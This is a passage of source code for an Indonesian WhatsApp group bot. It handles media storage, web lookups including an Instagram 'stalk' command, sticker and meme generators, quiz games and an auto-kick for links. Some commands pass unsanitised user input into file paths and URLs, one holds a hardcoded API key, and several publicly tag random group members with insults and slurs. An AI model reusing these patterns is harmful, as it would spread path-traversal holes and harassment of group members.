if (args.length !== 1) return reply("Masukkan Query nama image cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("image", q) == q) return reply("Nama Image tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("image", q)
addMedia("image", q)
reply(`[ *IMAGE-SAVE* ]\nSukses, Image("${q}.jpg") Berhasil terSave di database bot ini, Silahkan cek Image kamu di #listimage`)
} else reply(`Kirim image Dengan caption ${prefix + command}`)
break
case 'getimg': case 'getimage': case 'getfoto':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply(`Masukkan Query Nama image, List? Gunakan command #listimage`)
if (cekMedia("image", q) !== q) return reply("Nama Image tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listimage")
sendMedia("image",`./media/${q}.jpg`)
break
case 'listimg': case 'listimage': case 'listfoto':
if (cekUser("id", sender) == null) return Notdaftar()
if (ImageMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add image terlebih dahulu, Gunakan command #addimage")
rimurubotz.sendMessage(from, {text: `[ *LIST-IMAGE* ]\n• *Total* : ${ImageMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("image")}]
})
break
case 'deleteimg': case 'dellimg': case 'deleteimage': case 'dellimage': case 'deletefoto': case 'dellfoto': 
if (cekUser("id", sender) == null) return Notdaftar()
if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan nama image yang ingin dihapus")
if (cekMedia("image", q) !== q) return reply("Nama Image tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listimage")
deleteMedia("image", q)
only("sukses", rimurubotz, from)
break

case 'addvideo': case 'addmp4': 
if (cekUser("id", sender) == null) return Notdaftar()
if (isMedia || isQuotedVideo) {  
if (!q) return reply(`Masukkan Query Nama Video, Contoh ${prefix + command} megawati`)
if (args.length !== 1) return reply("Masukkan Query nama video cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("video", q) == q) return reply("Nama video tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("video", q)
addMedia("video", q)
reply(`[ *VIDEO-SAVE* ]\nSukses, Video("${q}.mp4") Berhasil terSave di database bot ini, Silahkan cek Video kamu di #listvideo`)
} else reply(`Kirim Video Dengan caption ${prefix + command}`)
break
case 'getvideo': case 'getmp4':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply(`Masukkan Query Nama Video, List? Gunakan command #listvideo`)
if (cekMedia("video", q) !== q) return reply("Nama video tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listvideo")
sendMedia("video",`./media/${q}.mp4`)
break
case 'listvideo': case 'getmp4': 
if (cekUser("id", sender) == null) return Notdaftar()
if (VideoMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add video terlebih dahulu, Gunakan command #addvideo")
rimurubotz.sendMessage(from, {text: `[ *LIST-VIDEO* ]\n• *Total* : ${VideoMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("video")}]
})
break
case 'deletevideo': case 'dellvideo': case 'deletemp4': case 'dellmp4':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan nama video yang ingin dihapus")
if (cekMedia("video", q) !== q) return reply("Nama video tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listvideo")
deleteMedia("video", q)
only("sukses", rimurubotz, from)
break


case 'adds': case 'addstiker': case 'addsticker':
if (cekUser("id", sender) == null) return Notdaftar()
if (isMedia || isQuotedSticker) { 
if (!q) return reply(`Masukkan Query Nama sticker, Contoh ${prefix + command} megawati`)
if (args.length !== 1) return reply("Masukkan Query nama sticker cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("sticker", q) == q) return reply("Nama sticker tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("sticker", q)
addMedia("sticker", q)
reply(`[ *STICKER-SAVE* ]\nSukses, sticker("${q}.webp") Berhasil terSave di database bot ini, Silahkan cek sticker kamu di #liststicker`)
} else reply(`Kirim sticker Dengan caption ${prefix + command}`)
break
case 'gets': case 'getstiker': case 'getsticker':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply(`Masukkan Query Nama sticker, List? Gunakan command #liststicker`)
if (cekMedia("sticker", q) !== q) return reply("Nama sticker tersebut tidak terdaftar di database bot, Silahkan cek kembali di #liststicker")
sendMedia("sticker",`./media/${q}.webp`)
break
case 'lists': case 'liststiker': case 'liststicker':
if (cekUser("id", sender) == null) return Notdaftar()
if (StickerMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add sticker terlebih dahulu, Gunakan command #addsticker")
rimurubotz.sendMessage(from, {text: `[ *LIST-STICKER* ]\n• *Total* : ${StickerMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("sticker")}]
})
break
case 'deletes': case 'dells': case 'deletestiker': case 'dellstiker': case 'deletesticker': case 'dellsticker': 
if (cekUser("id", sender) == null) return Notdaftar()
if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan nama sticker yang ingin dihapus")
if (cekMedia("sticker", q) !== q) return reply("Nama sticker tersebut tidak terdaftar di database bot, Silahkan cek kembali di #liststicker")
deleteMedia("sticker", q)
only("sukses", rimurubotz, from)
break


case 'addaudio': case 'addmp3': case 'addvn':
if (cekUser("id", sender) == null) return Notdaftar()
if (isMedia || isQuotedAudio) { 
if (!q) return reply(`Masukkan Query Nama audio, Contoh ${prefix + command} megawati`)
if (args.length !== 1) return reply("Masukkan Query nama audio cukup 1 kata, Contoh *Hehehe*")
if (cekMedia("audio", q) == q) return reply("Nama audio tersebut sudah ada sebelumnya, Silahkan Masukkan nama lain")
download("audio", q)
addMedia("audio", q)
reply(`[ *AUDIO-SAVE* ]\nSukses, audio("${q}.mp3") Berhasil terSave di database bot ini, Silahkan cek audio kamu di #listaudio`)
} else reply(`Kirim audio Dengan caption ${prefix + command}`)
break
case 'getaudio': case 'getmp3': case 'getvn':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply(`Masukkan Query Nama audio, List? Gunakan command #listaudio`)
if (cekMedia("audio", q) !== q) return reply("Nama audio tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listaudio")
sendMedia("audio",`./media/${q}.mp3`)
break
case 'listaudio': case 'listmp3': case 'listvn': 
if (cekUser("id", sender) == null) return Notdaftar()
if (AudioMedia.length == 0) return reply("Tidak ada apa apa disini, Silahkan add audio terlebih dahulu, Gunakan command #addaudio")
rimurubotz.sendMessage(from, {text: `[ *LIST-AUDIO* ]\n• *Total* : ${AudioMedia.length}`, buttonText: "OPEN", sections:  [{title: "ALL-LIST",
rows: listMedia("audio")}]
})
break
case 'deleteaudio': case 'dellaudio': case 'deletevn': case 'dellvn': case 'deletemp3': case 'dellmp3': 
if (cekUser("id", sender) == null) return Notdaftar()
if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan nama audio yang ingin dihapus")
if (cekMedia("audio", q) !== q) return reply("Nama audio tersebut tidak terdaftar di database bot, Silahkan cek kembali di #listaudio")
deleteMedia("audio", q)
only("sukses", rimurubotz, from)
break

case 'happymod':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply("Masukkan nama Apk")
var nyz = await api.search.happymod(q)
reply(await getResult("[ *HAPPYMOD* ]", ["Title","Url"],
[nyz.result[0].title, nyz.result[0].link]))
break
case 'carigrup': case 'carigrub':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply("Masukkan nama Group")
var nyz = await api.search.carigrup(q) 
reply(await getResult("[ *SEARCH-GRUP* ]", ["Nama","Url"],
[nyz.result[0].nama, nyz.result[0].link]))
break
case 'kusonime':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply("Masukkan nama anime")
var nyz = await api.search.kusonime(q) 
reply(await getResult("[ *KOSUNIME* ]", 
["Judul","Desk","Genre","Status","Produser","Rate","Type","Link","Total_Eps","Durasi","Tgl_Rilis"],
[nyz.result.judul, nyz.result.desk, nyz.result.genre, nyz.result.status, nyz.result.produser, nyz.result.rate, nyz.result.type, nyz.result.link, nyz.result.total_eps, nyz.result.durasi, nyz.result.tgl_rilis]))
break
case 'cuaca':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply("Masukkan nama kota")
var nyz = await api.search.cuaca(q) 
reply(await getResult("[ *CUACA* ]",
["Nama","Longitude","Latitude","Suhu","Angin","Kelembaban","Cuaca","Keterangan","Udara"],
[nyz.data.Nama, nyz.data.Longitude, nyz.data.Latitude, nyz.data.Suhu, nyz.data.Angin, nyz.data.Kelembaban, nyz.data.Cuaca, nyz.data.Keterangan, nyz.data.Udara]))
break
case 'artinama':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply("Masukkan nama")
var nyz = await api.search.artinama(q) 
reply(await getResult("[ *ARTINAMA* ]",
["Result"],
[nyz.result.split("(adsbygoogle = window.adsbygoogle || []).push({})")[1]]))
break
case 'igstalk':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply("Masukkan nama user instagram")
var nyz = await api.search.igstalk(q) 
console.log(nyz)
reply(await getResult("[ *STALKIG* ]",
["url","fullname","private","verified","bio","follower","following","conneted_fb","videotimeline","timeline","savedmedia","collections"],
[nyz.data.url, nyz.data.fullname, nyz.data.private, nyz.data.verified, nyz.data.bio, nyz.data.follower, nyz.data.following, nyz.data.conneted_fb, nyz.data.videotimeline, nyz.data.timeline, nyz.data.savedmedia, nyz.data.collections ]))
break
case 'wallpaper':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply("Masukkan query")
only("proses", rimurubotz, from)
var nyz = await api.search.wallpapercave(q) 
sendMedia("image", nyz.result[0], "😀")
break
case 'pinterest':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply("Masukkan kata")
var nyz = await api.search.pin(q) 
sendMedia("image", nyz[Math.floor(Math.random() * nyz.length)], "😀")
break

case 'imagesketch': case 'shit': case 'burn': case 'blur': case 'greyscale': case 'pixelate': case 'removebg': case 'beautiful': case 'trash': case 'jail': case 'wanted': case 'rip': case 'gay': case 'invert':
if (cekUser("id", sender) == null) return Notdaftar()
if (isMedia || isQuotedImage) { 
only("proses", rimurubotz, from)
sendMedia("image", `https://pecundang.herokuapp.com/api/${command}?url=${await download("imageUrl","makers")}`, "😀")
} else { reply("Tag/Kirim Image dengan caption " + prefix + command)}
break

case 'imagesketchme': case 'shitme': case 'burnme': case 'blurme': case 'greyscaleme': case 'pixelateme': case 'removebgme': case 'beautifulme': case 'trashme': case 'jailme': case 'wantedme': case 'ripme': case 'gayme': case 'invertme':
if (cekUser("id", sender) == null) return Notdaftar()
only("proses", rimurubotz, from)
sendMedia("image", `https://pecundang.herokuapp.com/api/${command.split("me")[0]}?url=${await download("PPUrl", sender)}`, "😀")
break
case 'imagesketchtag': case 'shittag': case 'burntag': case 'blurtag': case 'greyscaletag': case 'pixelatetag': case 'removebgtag': case 'beautifultag': case 'trashtag': case 'jailtag': case 'wantedtag': case 'riptag': case 'gaytag': case 'inverttag':
if (cekUser("id", sender) == null) return Notdaftar()
if (Tag() == "") return reply("tag Orang yang mau anda Jadikan objek")
only("proses", rimurubotz, from)
sendMedia("image", `https://pecundang.herokuapp.com/api/${command.split("tag")[0]}?url=${await download("PPUrl", Tag()[0])}`, "😀")
break


case 'ttpwhite': case 'ttpyellow': case 'ttpblue': case 'ttpred': case 'ttpgreen': case 'ttpblack': case 'ttpbrown':
case 'ttpteal': case 'ttpsilver': case 'ttppurple': case 'ttpgray': case 'ttporange': case 'ttpmaroon': case 'ttpaquamarine': case 'ttpcoral': case 'ttpfuchsia': case 'ttpwheat':
case 'ttplime': case 'ttpcrimson': case 'ttpkhaki': case 'ttpmagenta': case 'ttpplum': case 'ttpolive': case 'ttpcyan':
if (cekUser("id", sender) == null) return Notdaftar()
var nyz = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=${body.slice(4).trim().split(/ +/).shift().toLowerCase()}`
var nyz1 = await imageToBase64(JSON.stringify(nyz).replace(/\"/gi, ''))
fs.writeFileSync('getpp.jpeg', nyz1, 'base64')
await ffmpeg("getpp.jpeg")
.input("getpp.jpeg")
.on('error', function (error) { only("error", rimurubotz, from) })
.on('end', function () {rimurubotz.sendMessage(from, { sticker: {url: './getpp.webp'}, mimetype: 'image/webp' })})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./getpp.webp')
break

case 'meme1': case 'smeme1': case 'memegen1':
case 'meme2': case 'smeme2': case 'memegen2':
case 'meme3': case 'smeme3': case 'memegen3':
if (cekUser("id", sender) == null) return Notdaftar()
if (isMedia || isQuotedImage) { 
if (command == 'meme1' || command == 'smeme1' || command == 'memegen1') {
if (!q) return reply("Masukkan Text")
var nyz = `https://pecundang.herokuapp.com/api/memegen1?teks=${q}&img_url=${await download("imageUrl","makers")}`
}
if (command == 'meme2' || command == 'smeme2' || command == 'memegen2') {
if (!q1 && !q2) return reply("Masukkan Text1&text2")
var nyz = `https://pecundang.herokuapp.com/api/memegen2?teks1=${q1}&teks2=${q2}&img_url=${await download("imageUrl","makers")}`
}
if (command == 'meme3' || command == 'smeme3' || command == 'memegen3') {
if (!q) return reply("Masukkan Text")
var nyz = `https://pecundang.herokuapp.com/api/memegen3?teks=${q}&img_url=${await download("imageUrl","makers")}`
}
var nyz1 = await imageToBase64(JSON.stringify(nyz).replace(/\"/gi, ''))
fs.writeFileSync('getpp.jpeg', nyz1, 'base64')
await ffmpeg("getpp.jpeg")
.input("getpp.jpeg")
.on('error', function (error) { only("error", rimurubotz, from) })
.on('end', function () {rimurubotz.sendMessage(from, { sticker: {url: './getpp.webp'}, mimetype: 'image/webp' })})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./getpp.webp')
} else reply(`Kirim image Dengan caption ${prefix + command}`)
break
case 'waifu': case 'neko': case 'shinobu': case 'megumin': case 'bully': case 'cuddle': case 'hug': case 'cry': case 'awoo': case 'kiss': case 'lick':
case 'pat': case 'smug': case 'bonk': case 'yeet': case 'smile': case 'blush': case 'wave': case 'highfive': case 'handhold': case 'nom': case 'bite': case 'glomp':
case 'slap': case 'kill': case 'kick': case 'happy': case 'wink': case 'poke': case 'dance': case 'cringe':
if (cekUser("id", sender) == null) return Notdaftar()
fetchJson(`https://api.waifu.pics/sfw/${command}`).then(x => { reply(x.url) })
break
case 'ejek':  
case 'hai':  
case 'jatuhcinta':  
case 'jempol':  
case 'ketawa':  
case 'love':  
case 'nangis':  
case 'sakithati':  
case 'terimakasih':  
if (cekUser("id", sender) == null) return Notdaftar()
if (cekUser("premium", sender) == false) return reply("Maaf Fitur ini khusus member premium. Ingin mendapatkan premium? Silahkan hubungi owner")
if (!isGroup) return only("isGroup", rimurubotz, from)
if (Tag() == "") return reply("tag Orang yang mau anda " + command)
rimurubotz.sendMessage(from, {text:`(😈) Sukses ${command} @${Tag()[0].split("@")[0]}`, mentions:Tag()},{quoted:nay1})
if (command == "ejek"){ var emostick2 = "🤪🤪🤪🤪🤪🤪🤪🤪🤪🤪"
var emostick1 = "https://i.ibb.co/StT6YcL/ejek.webp" } 
if (command == "hai"){ var emostick2 = "👋👋👋👋👋👋👋👋👋👋"
var emostick1 = "https://i.ibb.co/LCr2VV0/hai.webp" } 
if (command == "jatuhcinta"){ var emostick2 = "🥰🥰🥰🥰🥰🥰🥰🥰🥰🥰"
var emostick1 = "https://i.ibb.co/rtVxyWy/jatuhcinta.webp" } 
if (command == "jempol"){ var emostick2 = "👍👍👍👍👍👍👍👍👍👍"
var emostick1 = "https://i.ibb.co/3z2ddjY/jempol.webp" } 
if (command == "ketawa"){ var emostick2 = "🤣🤣🤣🤣🤣🤣🤣🤣🤣🤣"
var emostick1 = "https://i.ibb.co/PWkcommand7y5/ketawa.webp" } 
if (command == "love"){ var emostick2 = "💖💖💖💖💖💖💖💖💖💖"
var emostick1 = "https://i.ibb.co/N18FfYw/love.webp" } 
if (command == "nangis"){ var emostick2 = "😭😭😭😭😭😭😭😭😭😭"
var emostick1 = "https://i.ibb.co/WV4vKHs/nangis.webp" } 
if (command == "sakithati"){ var emostick2 = "💔💔💔💔💔💔💔💔💔💔"
var emostick1 = "https://i.ibb.co/0Yx0mWQ/sakithati.webp" } 
if (command == "terimakasih"){ var emostick2 = "🙏🏼🙏🏼🙏🏼🙏🏼🙏🏼🙏🏼🙏🏼🙏🏼🙏🏼🙏🏼"
var emostick1 = "https://i.ibb.co/b6FGvPW/terimakasih.webp" } 
rimurubotz.sendMessage(Tag()[0], {sticker:{url: emostick1}},{quoted: { key: {fromMe: false, participant: `${botNumber}`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"conversation": "[ *EMOSTICK(SEND)* ]\n" + emostick2}}  })
break 
case 'cantik': case 'ganteng': case 'jelek': case 'burik': case 'ireng': case 'kaya': case 'miskin': case 'babi': case 'monyet': 
case 'bego': case 'beban': case 'pintar': case 'bodoh': case 'pendek': case 'tinggi': case 'kurus': case 'gemuk':  
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return reply("Gunakan fitur ini Group")
var nyz = []
Object.keys(groupMembers).forEach((i) => { 
nyz.push(groupMembers[i].id)
})
var nyz1 = nyz[Math.floor(Math.random() * nyz.length)]
rimurubotz.sendMessage(from, {text:`Hmm... Yang ter${command} Di group ini mungkin @${nyz1.split("@")[0]}`, mentions:[nyz1]},{quoted:nay1})
break
case 'unicode':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply("Masukkan Text")
var nyz = await fetchJson(`https://anabotofc.herokuapp.com/api/unicode?apikey=AnaBot&query=${q}`)
var rows = []
Object.keys(nyz.result).forEach((i) => {  
rows.push({title: nyz.result[i].title, rowId: prefix + command + ` ${q}&` + i}) })
if (!q2){ var nyz1 = "Silahkan pilih Salah satu Disini"
rimurubotz.sendMessage(from, {
text: nyz1,
buttonText: "OPEN",
sections: [{rows: rows}]})} 
if (q2){ var nyz1 = nyz.result[q2].uni
reply(nyz1)}
break
case 'audio1': case 'audio2': case 'audio3': case 'audio4': case 'audio5': case 'audio6': case 'audio7': case 'audio8': case 'audio9': case 'audio10': 
case 'audio11': case 'audio12': case 'audio13': case 'audio14': case 'audio15': case 'audio16': case 'audio17': case 'audio18': case 'audio19': case 'audio20':
if (cekUser("id", sender) == null) return Notdaftar()
sendMedia("vn",`https://md-devs.xyz/audio/${command}.m4a`)
break
case 'asahotak': case 'susunkata': case 'tebakkata': case 'tebaktebakan': case 'tebakbendera': case 'tebakkimia': case 'tekateki': case 'siapaaku': case 'tebakkalimat': case 'tebaklirik':
if (cekUser("id", sender) !== sender) return Notdaftar()
if (!q && cekUser("jawaban", sender) !== false) { return reply("Kamu sedang Bermain game sebelumnya, ingin hapus sesi game? ketik #dellsesi")}
if (q && cekUser("jawaban", sender) == false) return reply("Game Tersebut telah berakhir, Atau game Tersebut adalah milik orang lain, Ayo memulai game sendiri")
if (!q && cekUser("jawaban", sender) == false) { 
var nyz1 = await fetchJson(`https://md-devs.xyz/api/game?text=${command}`)
console.log(nyz1.jawaban)
setUser("±jawaban", sender, nyz1.jawaban)
return rimurubotz.sendMessage(from, {
text: `[ *${command}* ]\n` + nyz1.soal,
buttonText: "OPEN",
sections: [{rows:[
{title: nyz1.list_jawaban.a, rowId: prefix + command + " " + nyz1.list_jawaban.a},
{title: nyz1.list_jawaban.b, rowId: prefix + command + " " + nyz1.list_jawaban.b},
{title: nyz1.list_jawaban.c, rowId: prefix + command + " " + nyz1.list_jawaban.c},
{title: nyz1.list_jawaban.d, rowId: prefix + command + " " + nyz1.list_jawaban.d},
{title: nyz1.list_jawaban.e, rowId: prefix + command + " " + nyz1.list_jawaban.e},
{title: nyz1.list_jawaban.f, rowId: prefix + command + " " + nyz1.list_jawaban.f},
{title: nyz1.list_jawaban.g, rowId: prefix + command + " " + nyz1.list_jawaban.g},
{title: nyz1.list_jawaban.h, rowId: prefix + command + " " + nyz1.list_jawaban.h},
{title: nyz1.list_jawaban.i, rowId: prefix + command + " " + nyz1.list_jawaban.i},
{title: nyz1.list_jawaban.j, rowId: prefix + command + " " + nyz1.list_jawaban.j},
]}]
})
}
if (q && cekUser("jawaban", sender) !== false) {
if (q == cekUser("jawaban", sender)) {
reply(`[ *${command}* ]\nJawaban kamu *BENAR*, Kamu mendapatkan +1 Star, Ingin bermain lagi? Gunakan command ${prefix + command}`)
setUser("±jawaban", sender, false)
return setUser("+star", sender, 1)
}
if (q !== cekUser("jawaban", sender)) {
reply(`[ *${command}* ]\nJawaban kamu *SALAH*, Kamu mendapatkan 0 Star, Ingin bermain lagi? Gunakan command ${prefix + command}`)
return setUser("±jawaban", sender, false)
}
}
break
case 'dellsesi': case 'nyerah':
if (cekUser("jawaban", sender) == false) return reply("Kamu belum memainkan game sebelumnya")
reply("Sukses menghapus keseluruhan database game kamu")
setUser("±jawaban", sender, false)
break
default:  
if (isBotGroupAdmins && isGroup && dataOnly("antilink", "cek", from) == from){
if (budy.includes("https")) { 
if (isGroupAdmins) return reply("Admin Bebas Share Link!")
await rimurubotz.groupParticipantsUpdate(from, [sender], "remove") } 
if (budy.includes("http")) { 
if (isGroupAdmins) return reply("Admin Bebas Share Link!")
await rimurubotz.groupParticipantsUpdate(from, [sender], "remove")  } 
if (budy.includes("wa.me")) {
if (isGroupAdmins) return reply("Admin Bebas Share Link!")
await rimurubotz.groupParticipantsUpdate(from, [sender], "remove")  } 
if (budy.includes(".com")) { 
if (isGroupAdmins) return reply("Admin Bebas Share Link!")
await rimurubotz.groupParticipantsUpdate(from, [sender], "remove")  } 
if (budy.includes(".id")) { 
if (isGroupAdmins) return reply("Admin Bebas Share Link!")
await rimurubotz.groupParticipantsUpdate(from, [sender], "remove")  } 
if (budy.includes(".me")) { 
if (isGroupAdmins) return reply("Admin Bebas Share Link!")
await rimurubotz.groupParticipantsUpdate(from, [sender], "remove")  } 
if (budy.includes("t.me")) { 
if (isGroupAdmins) return reply("Admin Bebas Share Link!")
await rimurubotz.groupParticipantsUpdate(from, [sender], "remove")  } 
if (budy.includes("xyz")) { 
if (isGroupAdmins) return reply("Admin Bebas Share Link!")
await rimurubotz.groupParticipantsUpdate(from, [sender], "remove")  } 
if (budy.includes("herokuapp")) { 
if (isGroupAdmins) return reply("Admin Bebas Share Link!")
await rimurubotz.groupParticipantsUpdate(from, [sender], "remove")  } 
}
if (budy == "Assalamualaikum" || budy == "assalamualaikum"){
reply("Waalaikumsalam❤")
} // AUTORESPODER 
if (budy == "bot" || budy == "Bot" || budy == "BOT"  || budy == "p" || budy == "P") {
reply(`[ *BOT-NOTIF* ]\nYa? *${namabot}* Disini, Ada yang bisa saya bantu? Gunakan command #menu untuk melihat apa saja yang bisa saya lakukan,\n• *Owner* : Bot ini di buat dengan ❤ Oleh ${namaowner}`)
}



}} catch (e) {LogLoadingg(`${e}`)}}
